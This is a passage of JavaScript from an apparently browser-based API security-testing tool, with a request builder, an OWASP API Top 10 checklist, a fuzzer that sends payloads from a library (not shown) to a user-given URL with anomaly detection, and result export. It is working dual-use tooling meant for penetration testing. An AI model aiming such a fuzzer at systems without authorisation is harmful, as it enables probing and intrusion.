          const cls = r.blocked ? 's4xx' : String(r.status).startsWith('2') ? 's2xx' : String(r.status).startsWith('3') ? 's3xx' : String(r.status).startsWith('4') ? 's4xx' : 's5xx';
          return `<div class="af-result-card" style="${r.anomaly ? 'border-color:#ff4444' : ''}">
            <div class="af-status ${cls}">${esc(String(r.status))} ${r.anomaly && !r.blocked ? '<span class="af-badge anomaly" style="font-size:9px;margin-left:2px">!</span>' : ''}</div>
            <div class="af-timing">${typeof r.time === 'number' ? r.time + 'ms' : '—'}</div>
            <div class="af-payload-preview" title="${esc(r.payload)}">${esc(r.payload)}</div>
            <div class="af-size">${typeof r.size === 'number' ? formatBytes(r.size) : '—'}</div>
          </div>`;
        }).join('')}
        ${results.length > 100 ? `<div style="text-align:center;padding:12px;color:#4a6a8a;font-size:13px">Showing 100 of ${results.length} results</div>` : ''}
      </div>`;
  }

  function renderOWASP() {
    const checked = state.owaspChecks.filter(Boolean).length;
    return `
      <div class="af-panel" style="display:flex;justify-content:space-between;align-items:center">
        <div>
          <h3 style="margin:0">OWASP API Security Top 10 (2023)</h3>
          <p style="margin:4px 0 0;font-size:13px;color:#6a8aaa">Security checklist for API penetration testing</p>
        </div>
        <div style="text-align:right">
          <div style="font-size:24px;font-weight:700;color:${checked === 10 ? '#00ff88' : '#00aaff'}">${checked}/10</div>
          <div style="font-size:11px;color:#6a8aaa">Checked</div>
        </div>
      </div>

      ${AF_OWASP.map((item, i) => `
        <div class="af-owasp-item" style="${state.owaspChecks[i] ? 'border-color:#00ff88;opacity:.7' : ''}">
          <div class="af-owasp-head">
            <input type="checkbox" class="af-checkbox" data-owasp="${i}" ${state.owaspChecks[i] ? 'checked' : ''}>
            <span class="af-owasp-id">${item.id}</span>
            <span class="af-owasp-title" style="${state.owaspChecks[i] ? 'text-decoration:line-through' : ''}">${esc(item.title)}</span>
          </div>
          <div class="af-owasp-desc">${esc(item.desc)}</div>
          <div class="af-owasp-check"><strong>Test:</strong> ${esc(item.check)}</div>
        </div>`).join('')}`;
  }

  function bindEvents() {
    const $ = s => container.querySelector(s);
    const $$ = s => container.querySelectorAll(s);

    if (state.tab === 'builder') {
      const methodEl = $('#af-method');
      if (methodEl) methodEl.onchange = () => { state.method = methodEl.value; render(); };
      const urlEl = $('#af-url');
      if (urlEl) urlEl.oninput = () => { state.url = urlEl.value; };
      const bodyEl = $('#af-body');
      if (bodyEl) bodyEl.oninput = () => { state.body = bodyEl.value; };

      $$('[data-bodytype]').forEach(b => b.onclick = () => { state.bodyType = b.dataset.bodytype; render(); });

      $$('[data-hfield]').forEach(inp => {
        inp.oninput = () => {
          const idx = parseInt(inp.dataset.hidx);
          state.headers[idx][inp.dataset.hfield] = inp.value;
        };
      });

      $$('[data-hremove]').forEach(btn => {
        btn.onclick = () => { state.headers.splice(parseInt(btn.dataset.hremove), 1); render(); };
      });

      const addHeader = $('#af-add-header');
      if (addHeader) addHeader.onclick = () => { state.headers.push({ key: '', val: '' }); render(); };

      const sendBtn = $('#af-send');
      if (sendBtn) sendBtn.onclick = () => sendRequest();
    }

    if (state.tab === 'payloads') {
      $$('.af-payload-cat').forEach(cat => {
        cat.querySelector('.af-payload-cat-head').onclick = () => {
          state._expandedCat = state._expandedCat === cat.dataset.catkey ? null : cat.dataset.catkey;
          render();
        };
      });

      $$('[data-copy-cat]').forEach(btn => {
        btn.onclick = e => {
          e.stopPropagation();
          const key = btn.dataset.copyCat;
          const text = AF_PAYLOADS[key].payloads.join('\n');
          navigator.clipboard.writeText(text);
          btn.textContent = 'Copied!';
          setTimeout(() => { btn.textContent = 'Copy All Payloads'; }, 1500);
        };
      });
    }

    if (state.tab === 'fuzzer') {
      const fuzzUrl = $('#af-fuzz-url');
      if (fuzzUrl) fuzzUrl.oninput = () => { state.url = fuzzUrl.value; };
      const fuzzTarget = $('#af-fuzz-target');
      if (fuzzTarget) fuzzTarget.onchange = () => { state.fuzzTarget = fuzzTarget.value; };
      const fuzzCat = $('#af-fuzz-cat');
      if (fuzzCat) fuzzCat.onchange = () => { state.fuzzCategory = fuzzCat.value; render(); };
      const fuzzMethod = $('#af-fuzz-method');
      if (fuzzMethod) fuzzMethod.onchange = () => { state.method = fuzzMethod.value; };
      const startBtn = $('#af-start-fuzz');
      if (startBtn) startBtn.onclick = () => {
        if (state.fuzzRunning) {
          state.fuzzRunning = false;
          render();
        } else {
          startFuzzing();
        }
      };
    }

    if (state.tab === 'results') {
      const exportJson = $('#af-export-json');
      if (exportJson) exportJson.onclick = () => exportResults('json');
      const exportCsv = $('#af-export-csv');
      if (exportCsv) exportCsv.onclick = () => exportResults('csv');
    }

    if (state.tab === 'owasp') {
      $$('[data-owasp]').forEach(cb => {
        cb.onchange = () => {
          state.owaspChecks[parseInt(cb.dataset.owasp)] = cb.checked;
          render();
        };
      });
    }
  }

  function buildHeaders() {
    const h = {};
    state.headers.forEach(hd => {
      const k = (hd.key || '').trim();
      if (k) h[k] = hd.val || '';
    });
    return h;
  }

  function blockedMessage(err) {
    // A failed fetch in the browser is almost always CORS, a network error,
    // or this site's Content-Security-Policy connect-src restriction. The
    // browser does not reveal which, so report honestly without inventing data.
    const msg = err && err.message ? err.message : String(err);
    return 'Request could not be completed. The browser or this site’s security policy blocked it '
      + '(cross-origin / CORS restriction, this site’s Content-Security-Policy connect-src, or a network error). '
      + 'No response data is available. Detail: ' + msg;
  }

  async function sendRequest() {
    const url = (state.url || '').trim();
    if (!url) {
      state.manualResult = { error: 'Enter a request URL first.' };
      render();
      return;
    }
    let parsed;
    try { parsed = new URL(url); } catch {
      state.manualResult = { error: 'That is not a valid absolute URL (include http:// or https://).' };
      render();
      return;
    }

    state.manualResult = { pending: true };
    render();

    const opts = { method: state.method, headers: buildHeaders() };
    if (!['GET', 'HEAD'].includes(state.method) && state.body) opts.body = state.body;

    const t0 = performance.now();
    try {
      const res = await fetch(url, opts);
      const bodyText = await res.text();
      const timeMs = Math.round(performance.now() - t0);
      const size = new TextEncoder().encode(bodyText).length;
      const headers = [];
      res.headers.forEach((v, k) => headers.push([k, v]));
      state.manualResult = {
        status: res.status,
        statusText: res.statusText,
        timeMs,
        size,
        headers,
        bodyPreview: bodyText.slice(0, 4000),
        truncated: bodyText.length > 4000
      };
    } catch (err) {
      state.manualResult = { error: blockedMessage(err) };
    }
    render();
  }

  function renderManualResult() {
    const r = state.manualResult;
    if (!r) return '';
    if (r.pending) {
      return `<div class="af-panel"><h3>Response</h3><div style="color:#6a8aaa;font-size:13px">Sending real request…</div></div>`;
    }
    if (r.error) {
      return `<div class="af-panel" style="border-color:#ff4444"><h3 style="color:#ff4444">Request blocked</h3>
        <div style="font-size:13px;color:#c8d6e5;line-height:1.6">${esc(r.error)}</div></div>`;
    }
    const cls = String(r.status).startsWith('2') ? 's2xx' : String(r.status).startsWith('3') ? 's3xx' : String(r.status).startsWith('4') ? 's4xx' : 's5xx';
    return `<div class="af-panel"><h3>Response (live)</h3>
      <div class="af-stats" style="margin-bottom:16px">
        <div class="af-stat"><div class="af-stat-val"><span class="af-status ${cls}" style="display:inline-block;padding:4px 10px">${r.status}</span></div><div class="af-stat-label">${esc(r.statusText || '')}</div></div>
        <div class="af-stat"><div class="af-stat-val" style="color:#00ff88">${r.timeMs}ms</div><div class="af-stat-label">Round Trip</div></div>
        <div class="af-stat"><div class="af-stat-val" style="color:#ffaa00">${formatBytes(r.size)}</div><div class="af-stat-label">Body Size</div></div>
      </div>
      <div style="font-size:12px;color:#4a6a8a;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">Response Headers</div>
      <div style="background:#1a2744;padding:12px;border-radius:6px;font-family:monospace;font-size:12px;color:#8ab4d0;line-height:1.7;margin-bottom:16px;max-height:180px;overflow:auto">
        ${r.headers.length ? r.headers.map(([k, v]) => `${esc(k)}: ${esc(v)}`).join('<br>') : '(no readable headers — cross-origin responses expose only a limited set)'}
      </div>
      <div style="font-size:12px;color:#4a6a8a;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">Body${r.truncated ? ' (first 4000 chars)' : ''}</div>
      <pre style="background:#1a2744;padding:12px;border-radius:6px;font-size:12px;color:#c8d6e5;overflow:auto;max-height:300px;white-space:pre-wrap;word-break:break-all;margin:0">${esc(r.bodyPreview) || '(empty body)'}</pre>
    </div>`;
  }

  const FUZZ_MAX = 50;
  const FUZZ_DELAY = 250;

  function buildFuzzTarget(payload) {
    // Replace the FUZZ marker; if none present, append to query string.
    const url = state.url || '';
    let body = state.body || '';
    let finalUrl = url;
    if (state.fuzzTarget === 'body') {
      body = body.includes('FUZZ') ? body.split('FUZZ').join(payload) : body;
    } else if (state.fuzzTarget !== 'header') {
      finalUrl = url.includes('FUZZ') ? url.split('FUZZ').join(encodeURIComponent(payload)) : url;
    }
    return { finalUrl, body };
  }

  async function startFuzzing() {
    const all = AF_PAYLOADS[state.fuzzCategory]?.payloads || [];
    if (!all.length) return;
    if (!(state.url || '').trim()) {
      state.fuzzResults = [];
      state.manualError = 'Enter a target URL (with a FUZZ marker) first.';
      state.tab = 'fuzzer';
      render();
      return;
    }
    const payloads = all.slice(0, FUZZ_MAX);

    state.manualError = null;
    state.fuzzRunning = true;
    state.fuzzResults = [];
    render();

    let baseline = null;
    for (let idx = 0; idx < payloads.length; idx++) {
      if (!state.fuzzRunning) break;
      const payload = payloads[idx];
      const { finalUrl, body } = buildFuzzTarget(payload);
      const hdrs = buildHeaders();
      if (state.fuzzTarget === 'header') {
        Object.keys(hdrs).forEach(k => { if (hdrs[k].includes('FUZZ')) hdrs[k] = hdrs[k].split('FUZZ').join(payload); });
      }
      const opts = { method: state.method, headers: hdrs };
      if (!['GET', 'HEAD'].includes(state.method) && body) opts.body = body;

      let entry;
      const t0 = performance.now();
      try {
        const res = await fetch(finalUrl, opts);
        const text = await res.text();
        const timeMs = Math.round(performance.now() - t0);
        const size = new TextEncoder().encode(text).length;
        if (!baseline) baseline = { status: res.status, time: timeMs, size };
        const anomaly = res.status !== baseline.status ||
          timeMs > baseline.time * 2.5 + 200 ||
          Math.abs(size - baseline.size) > baseline.size * 0.35;
        entry = { payload, status: res.status, time: timeMs, size, anomaly };
      } catch (err) {
        entry = { payload, status: 'blocked', time: null, size: null, anomaly: true, blocked: true, error: String((err && err.message) || err) };
      }
      state.fuzzResults.push(entry);

      const progress = container.querySelector('#af-fuzz-progress');
      const statusEl = container.querySelector('#af-fuzz-status');
      if (progress) progress.style.width = `${Math.round((idx + 1) / payloads.length * 100)}%`;
      if (statusEl) statusEl.textContent = `Sent ${idx + 1}/${payloads.length}: ${payload.substring(0, 60)}`;

      if (idx < payloads.length - 1 && state.fuzzRunning) {
        await new Promise(r => setTimeout(r, FUZZ_DELAY));
      }
    }

    state.fuzzRunning = false;
    state.tab = 'results';
    render();
  }

  function formatBytes(b) {
    if (b < 1024) return b + 'B';
    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + 'KB';
    return (b / (1024 * 1024)).toFixed(1) + 'MB';
  }

  function exportResults(format) {
    const results = state.fuzzResults;
    let content, mime, ext;

    if (format === 'json') {
      content = JSON.stringify(results, null, 2);
      mime = 'application/json';
      ext = 'json';
    } else {
      const header = 'Payload,Status,Time(ms),Size(bytes),Anomaly';
      const rows = results.map(r => `"${r.payload.replace(/"/g, '""')}",${r.status},${r.time},${r.size},${r.anomaly}`);
      content = [header, ...rows].join('\n');
      mime = 'text/csv';
      ext = 'csv';
    }

    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `fuzz-results-${Date.now()}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
  }

  render();
}
